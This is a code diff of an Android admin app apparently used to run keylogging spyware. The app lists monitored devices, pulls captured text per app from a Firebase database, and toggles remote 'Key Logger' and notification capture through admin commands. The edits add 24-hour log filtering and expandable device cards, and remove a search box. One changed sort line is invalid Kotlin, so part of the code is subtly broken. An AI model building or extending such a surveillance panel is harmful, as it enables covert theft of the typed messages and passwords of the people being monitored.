@@ -2,14 +2,11 @@ package com.example.mykeyboardadmin
 
 import android.graphics.Color
 import android.os.Bundle
-import android.text.Editable
-import android.text.TextWatcher
 import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
-import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
@@ -34,10 +31,8 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var txtAppsToday: TextView
     private lateinit var txtActiveNodes: TextView
     private lateinit var txtLiveStatusPill: TextView
-    private lateinit var etDeviceSearch: EditText
 
     private val masterDeviceList = mutableListOf<DeviceModel>()
-    private val filteredDeviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
@@ -50,6 +45,7 @@ class AdminMainActivity : AppCompatActivity() {
         var notifications: Boolean = true,
         var selectedAppFilter: String? = null,
         var lastSeenTimestamp: Long = 0L,
+        var isExpanded: Boolean = false,
         val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
     ) {
         val logFeed: String
@@ -71,9 +67,9 @@ class AdminMainActivity : AppCompatActivity() {
                     rawEntries.size
                 }
                 return if (sb.isNotEmpty()) {
-                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
+                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Last 24h) (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
                 } else {
-                    "No telemetry recorded for ${selectedAppFilter ?: "device"}."
+                    "No telemetry recorded for ${selectedAppFilter ?: "device"} in the last 24 hours."
                 }
             }
 
@@ -107,7 +103,6 @@ class AdminMainActivity : AppCompatActivity() {
         txtAppsToday = findViewById<TextView>(R.id.txtAppsToday)
         txtActiveNodes = findViewById<TextView>(R.id.txtActiveNodes)
         txtLiveStatusPill = findViewById<TextView>(R.id.txtLiveStatusPill)
-        etDeviceSearch = findViewById<EditText>(R.id.etDeviceSearch)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
@@ -117,7 +112,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
-        adapter = DeviceAdapter(filteredDeviceList) { device, type, newState ->
+        adapter = DeviceAdapter(masterDeviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
             if (type == "key") {
                 device.keylogging = newState
@@ -133,14 +128,6 @@ class AdminMainActivity : AppCompatActivity() {
         }
         recyclerView.adapter = adapter
 
-        etDeviceSearch.addTextChangedListener(object : TextWatcher {
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
-                filterDevices(s?.toString() ?: "")
-            }
-            override fun afterTextChanged(s: Editable?) {}
-        })
-
         loadConnectedDevices()
     }
 
@@ -149,21 +136,6 @@ class AdminMainActivity : AppCompatActivity() {
         if (devicesListener != null && devicesRef != null) {
             devicesRef?.removeEventListener(devicesListener!!)
         }
-    }
-
-    private fun filterDevices(query: String) {
-        filteredDeviceList.clear()
-        if (query.isBlank()) {
-            filteredDeviceList.addAll(masterDeviceList)
-        } else {
-            val lowerQuery = query.lowercase(Locale.getDefault())
-            for (device in masterDeviceList) {
-                if (device.name.lowercase(Locale.getDefault()).contains(lowerQuery)) {
-                    filteredDeviceList.add(device)
-                }
-            }
-        }
-        adapter.notifyDataSetChanged()
     }
 
     private fun loadConnectedDevices() {
@@ -176,6 +148,7 @@ class AdminMainActivity : AppCompatActivity() {
             override fun onDataChange(snapshot: DataSnapshot) {
                 var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
+                val cutoff24h = now - (24 * 60 * 60 * 1000L)
                 var maxLastSeen = 0L
 
                 for (child in snapshot.children) {
@@ -190,7 +163,7 @@ class AdminMainActivity : AppCompatActivity() {
 
                     for (appChild in child.children) {
                         val rawApp = appChild.key ?: continue
-                        val prettyApp = getPrettyAppName(rawApp)
+                        if (rawApp.startsWith("notification_")) continue // Exclude notifications from app usage/telemetry count
                         for (entry in appChild.children) {
                             val text = entry.child("text").getValue(String::class.java)
                                 ?: entry.child("title").getValue(String::class.java)
@@ -198,7 +171,7 @@ class AdminMainActivity : AppCompatActivity() {
                                 ?: continue
 
                             val timestampMillis = parseTimestamp(entry.child("timestamp").value)
-                            if (timestampMillis != null && text.isNotBlank() && text != "null") {
+                            if (timestampMillis != null && timestampMillis >= cutoff24h && text.isNotBlank() && text != "null") {
                                 totalEntriesCount++
                                 if (timestampMillis > maxLastSeen) {
                                     maxLastSeen = timestampMillis
@@ -240,7 +213,7 @@ class AdminMainActivity : AppCompatActivity() {
                         txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
                     }
 
-                    filterDevices(etDeviceSearch.text?.toString() ?: "")
+                    adapter.notifyDataSetChanged()
                 }
             }
 
@@ -320,9 +293,11 @@ class AdminMainActivity : AppCompatActivity() {
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
+                val cutoff24h = System.currentTimeMillis() - (24 * 60 * 60 * 1000L)
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
+                    if (rawApp.startsWith("notification_")) continue // Exclude notifications completely - application usage only
                     val prettyApp = getPrettyAppName(rawApp)
                     for (entry in appChild.children) {
                         val text = entry.child("text").getValue(String::class.java)
@@ -332,14 +307,15 @@ class AdminMainActivity : AppCompatActivity() {
 
                         val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
 
-                        if (text.isNotBlank() && text != "null") {
+                        // Load only last 24 hour logs to prevent lag and optimize memory
+                        if (timestampMillis >= cutoff24h && text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
                         }
                     }
                 }
 
                 // Sort newest on top
-                entries.sortByDescending { it.first }
+                entries.sortByDescending { _ -> _.first }
 
                 val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
@@ -359,6 +335,8 @@ class AdminMainActivity : AppCompatActivity() {
     ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {
 
         class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
+            val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
+            val layoutExpandableContent: View = view.findViewById<View>(R.id.layoutExpandableContent)
             val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
             val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
             val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
@@ -380,7 +358,21 @@ class AdminMainActivity : AppCompatActivity() {
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
             holder.txtDeviceName.text = device.name
-            holder.txtDeviceSub.text = "Active Node // Full Telemetry"
+
+            // Update subtitle and expandable content visibility based on isExpanded state
+            if (device.isExpanded) {
+                holder.txtDeviceSub.text = "Active Node // Expanded (24h Logs)"
+                holder.layoutExpandableContent.visibility = View.VISIBLE
+            } else {
+                holder.txtDeviceSub.text = "Active Node // Tap to Expand"
+                holder.layoutExpandableContent.visibility = View.GONE
+            }
+
+            // Click header to toggle expand/collapse state
+            holder.layoutDeviceHeader.setOnClickListener {
+                device.isExpanded = !device.isExpanded
+                notifyItemChanged(position)
+            }
 
             if (device.keylogging) {
                 holder.btnKey.text = "Key Logger: ON"
@@ -402,7 +394,7 @@ class AdminMainActivity : AppCompatActivity() {
             if (device.selectedAppFilter != null) {
                 holder.layoutFilterHeader.visibility = View.VISIBLE
                 val totalForApp = device.rawEntries.count { it.second == device.selectedAppFilter }
-                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (Full Logs: $totalForApp)"
+                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (24h Logs: $totalForApp)"
                 holder.btnBackToAll.setOnClickListener {
                     device.selectedAppFilter = null
                     notifyItemChanged(position)
@@ -446,7 +438,7 @@ class AdminMainActivity : AppCompatActivity() {
 
             if (sortedApps.isEmpty()) {
                 val emptyTv = TextView(context).apply {
-                    text = "No app activity recorded today."
+                    text = "No app usage recorded today."
                     setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
                     setTextColor(Color.parseColor("#94A3B8"))
                 }
@@ -481,7 +473,7 @@ class AdminMainActivity : AppCompatActivity() {
                 }
 
                 val countTv = TextView(context).apply {
-                    text = "$count records"
+                    text = "$count events"
                     setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 10f)
                     setTextColor(Color.parseColor("#94A3B8"))
                     typeface = android.graphics.Typeface.MONOSPACE
